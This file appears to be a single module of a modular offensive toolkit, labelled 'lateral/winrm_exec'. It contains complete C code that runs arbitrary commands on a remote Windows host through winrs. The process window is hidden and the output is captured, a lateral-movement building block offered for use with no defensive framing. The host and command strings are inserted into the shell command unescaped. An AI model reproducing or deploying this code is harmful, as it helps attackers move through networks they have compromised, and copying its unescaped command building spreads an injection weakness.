// chunk: lateral/winrm_exec
// depends: (none)
// provides: lateral_winrm
// headers: windows.h
// note: Remote command execution via WinRM (winrs)

#ifndef CHUNK_LATERAL_WINRM_EXEC
#define CHUNK_LATERAL_WINRM_EXEC

static int lateral_winrm(const char *target_host, const char *command,
                         char *output, DWORD output_size, DWORD *output_len) {
    char winrs_cmd[2048];
    snprintf(winrs_cmd, sizeof(winrs_cmd),
             "winrs -r:%s %s", target_host, command);

    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hReadPipe, hWritePipe;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return 0;
    }

    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, winrs_cmd, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return 0;
    }

    CloseHandle(hWritePipe);

    *output_len = 0;
    DWORD bytesRead;
    while (ReadFile(hReadPipe, output + *output_len,
                    output_size - *output_len - 1, &bytesRead, NULL)) {
        if (bytesRead == 0) break;
        *output_len += bytesRead;
        if (*output_len >= output_size - 1) break;
    }
    output[*output_len] = '\0';

    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 30000);

    DWORD exitCode;
    GetExitCodeProcess(pi.hProcess, &exitCode);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return exitCode == 0 ? 1 : 0;
}

#endif
